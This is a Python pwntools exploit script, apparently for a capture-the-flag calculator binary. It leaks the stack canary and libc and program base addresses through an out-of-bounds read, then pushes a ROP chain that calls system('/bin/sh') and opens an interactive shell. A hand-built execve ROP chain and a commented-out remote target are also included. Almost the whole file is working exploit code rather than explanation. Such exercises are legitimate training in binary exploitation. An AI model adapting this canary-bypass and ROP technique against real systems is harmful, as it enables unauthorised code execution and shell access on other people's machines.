#!/usr/bin/env python

from pwn import *
from struct import pack
import sys
import time

# only use this for the remote, because this rop is expecting
# the remote's version of libc
def gen_payload(base_address):
    # Padding goes here
    p = ''

    p += pack('<Q', base_address + 0x0000000000001b96) # pop rdx ; ret
    p += pack('<Q', base_address + 0x00000000003eb1a0) # @ .data
    p += pack('<Q', base_address + 0x00000000000439c8) # pop rax ; ret
    p += '/bin//sh'
    p += pack('<Q', base_address + 0x000000000003093c) # mov qword ptr [rdx], rax ; ret
    p += pack('<Q', base_address + 0x0000000000001b96) # pop rdx ; ret
    p += pack('<Q', base_address + 0x00000000003eb1a8) # @ .data + 8
    p += pack('<Q', base_address + 0x00000000000b17c5) # xor rax, rax ; ret
    p += pack('<Q', base_address + 0x000000000003093c) # mov qword ptr [rdx], rax ; ret
    p += pack('<Q', base_address + 0x000000000002155f) # pop rdi ; ret
    p += pack('<Q', base_address + 0x00000000003eb1a0) # @ .data
    p += pack('<Q', base_address + 0x0000000000023e6a) # pop rsi ; ret
    p += pack('<Q', base_address + 0x00000000003eb1a8) # @ .data + 8
    p += pack('<Q', base_address + 0x0000000000001b96) # pop rdx ; ret
    p += pack('<Q', base_address + 0x00000000003eb1a8) # @ .data + 8
    p += pack('<Q', base_address + 0x00000000000b17c5) # xor rax, rax ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000d0e00) # add rax, 1 ; ret
    p += pack('<Q', base_address + 0x00000000000013c0) # syscall
    return p

# pwntools settings
context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['tmux', 'splitw', '-v']

# globals
offset_stack_fn_ret_addr = 0x7c2

# local
offset_puts = 0x0000000000068f90
offset___libc_start_main_ret = 0x202e1
offset_system = 0x000000000003f480
offset_str_bin_sh = 0x1619d9
endpoint = process("./stack-0")

# remote
# remote_libc = "libc6_2.27-3ubuntu1_amd64.so"
# offset_puts = 0x00000000000809c0
# offset___libc_start_main_ret = 0x21b97
# offset_system = 0x000000000004f440
# offset_str_bin_sh = 0x1b3e9a
# endpoint = remote("pwn.reversing.io", 1337)
# endpoint.recvuntil("> ")
# endpoint.sendline("1")
# endpoint.recvuntil("> ")
# endpoint.sendline("2")
# endpoint.recvuntil("> ")
# endpoint.sendline("1")

endpoint.recvuntil("calculator!\n")
time.sleep(1)

def chunks(l, n):
    """Yield successive n-sized chunks from l."""
    for i in range(0, len(l), n):
        yield l[i:i + n]

def read_base():
    endpoint.send(p8(0))
    endpoint.recvuntil("The base of the calculator stack is ")
    return int(endpoint.recvline().strip())

def push(val):
    endpoint.send(p8(1) + p64(val))

def pop_pop_add_push():
    endpoint.send(p8(2))

def read_stack_var(offset):
    if offset <= 0:
        print("Offset {} can't be <= 0".format(offset))
        sys.exit()

    # fill stack with zeros 
    for _ in range(offset):
        push(0)

    for _ in range(offset):
        pop_pop_add_push()

    return read_base()

def finish():
    endpoint.send('\n')
    # endpoint.sendline(p8(4))

"""
# implicit return address
push r15
push r14
push r13
push r12
push rbp
push rbx
sub rsp - 0x68
"""
"""
# implicit return address
r15
r14
r13
r12
rbp
rbx
rsp + 0x58: cookie
rsp + 0x10: stack_buffer
"""
stack_contents = [read_stack_var(i) for i in range(1, 20)]
cookie = stack_contents[8]
stack_fn_ret_addr = stack_contents[16]
libc_start_main_ret_addr = stack_contents[18]

# print stack contents
for i, var in enumerate(stack_contents):
    print("{:02}, rsp + {:x}: {:x}".format(i, 0x18 + i*8, var))

print("cookie: {:8x}".format(cookie))
print("stack_fn_ret_addr: {:8x}".format(stack_fn_ret_addr))
print("libc_start_main_ret_addr: {:8x}".format(libc_start_main_ret_addr))
libc_base = libc_start_main_ret_addr - offset___libc_start_main_ret 
system = libc_base + offset_system
str_bin_sh = libc_base + offset_str_bin_sh
program_base = stack_fn_ret_addr - offset_stack_fn_ret_addr
puts = libc_base + offset_puts 

print("libc_base: {:8x}".format(libc_base))
print("program_base: {:8x}".format(program_base))

resolvable = {
    "system": system,
    "puts": puts
}
context.arch = 'amd64'

pop_rdi_gadget = program_base + 0x9fd
# pop_rdi_gadget = libc_base + 0x2155f
# payload = [pop_rdi_gadget, str_bin_sh, puts, 0xdeadbeefdeadbeef]
payload = [pop_rdi_gadget, str_bin_sh, system, libc_start_main_ret_addr]

# desperate times, desperate mesaures
# payload = gen_payload(libc_base)
# payload = map(u64, chunks(payload, 8)) + [libc_start_main_ret_addr]

# This takes you back to the beginning of the vulnerable function
# payload = [ program_base + 0x920  ]
stack_contents = [0x4141414141414141 for _ in range(17)] + payload
stack_contents[9] = cookie

for val in stack_contents:
    print("pushing 0x{:016x}".format(val))
    push(val)

# if we want to debug, this will open up a debug session
# in another tmux window
# gdb.attach(endpoint)

finish()
endpoint.interactive()


